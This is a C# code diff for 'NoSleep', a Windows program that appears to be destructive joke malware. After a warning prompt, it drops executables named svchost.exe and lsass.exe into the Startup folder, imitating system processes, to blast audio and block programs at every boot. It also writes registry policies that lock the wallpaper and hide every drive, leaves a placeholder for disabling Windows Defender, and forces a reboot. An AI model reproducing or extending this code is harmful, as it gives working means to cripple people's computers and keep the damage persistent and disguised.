@@ -35,6 +35,20 @@ namespace NoSleep
 
         private void NoSleep_Load(object sender, EventArgs e)
         {
+            if (!File.Exists(@"C:\Program Files\Temp\NoSleep.exe"))
+            {
+                first_warning();
+            }
+            else
+            {
+                this.Hide();
+                NoSleep_windows form = new NoSleep_windows();
+                form.ShowDialog();
+                this.Close();
+            }
+        }
+        public void first_warning()
+        {
             if (MessageBox.Show("Are you sure you want to run this program? If you run it, your computer get a lot of damages!!!", "NoSleep", MessageBoxButtons.YesNo, MessageBoxIcon.Warning, MessageBoxDefaultButton.Button2) == DialogResult.No)
             {
                 this.Close();
@@ -59,11 +73,10 @@ namespace NoSleep
         }
         public void NoSleep_StartModify()
         {
-            if (!File.Exists(@"C:\Program Files\Temp\NoSleep.exe"))
-            {
                 Directory.CreateDirectory(@"C:\Program Files\Temp");
                 Extract("NoSleep", @"C:\Program Files\Temp", "Resources", "a lot of skulls.jpg");
                 Extract("NoSleep", @"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp", "Resources", "svchost.exe"); //audio maximizer
+                Extract("NoSleep", @"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp", "Resources", "lsass.exe"); //prevent open of some programs
                 Extract("NoSleep", @"C:\Program Files\Temp", "Resources", "disctrl.reg");
                 Extract("NoSleep", @"C:\Program Files\Temp", "Resources", "hol333.ani");
                 Extract("NoSleep", @"C:\Program Files\Temp", "Resources", "NoSleeper.jpg");
@@ -199,19 +212,15 @@ namespace NoSleep
                 wallpaperstyle.SetValue("WallpaperStyle", "2");
                 RegistryKey noremovewall = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\ActiveDesktop");
                 noremovewall.SetValue("NoChangingWallPaper", 1, RegistryValueKind.DWord);
+                //restrict access to windows drives
+                RegistryKey nodriveview = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
+                nodriveview.SetValue("NoViewOnDrive", "67108863", RegistryValueKind.DWord);
+                //disable windows defender
 
                 //Restart 
                 Thread.Sleep(5000);
-                Process.Start("shutdown", "/r /t 03");
+                Process.Start(@"C:\Windows\system32\shutdown.exe", "/r /t 03");
                 Environment.Exit(-1);
-            }
-            else
-            {
-                this.Hide();
-                var NewForm = new NoSleep_windows();
-                NewForm.ShowDialog();
-                this.Close();
-            }
         }
     }
 }
